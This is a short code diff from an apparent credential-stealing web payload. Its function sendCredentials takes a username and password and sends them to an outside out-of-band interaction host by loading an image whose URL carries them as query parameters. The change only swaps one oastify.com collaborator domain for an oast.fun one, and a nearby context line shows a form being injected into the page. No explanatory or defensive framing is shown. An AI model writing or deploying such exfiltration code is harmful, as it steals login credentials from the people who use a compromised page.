@@ -60,7 +60,7 @@ document.body.appendChild(form);
 
 function sendCredentials(username, password) {
   var img = new Image();
-  img.src = `http://at7iedx7ss6o0snh3crggfy3zu5mtch1.oastify.com?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
+  img.src = `http://cukyszggmaaaxoawavatbwoef3pnwc0q9.oast.fun?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
   document.body.appendChild(img);
 }
 
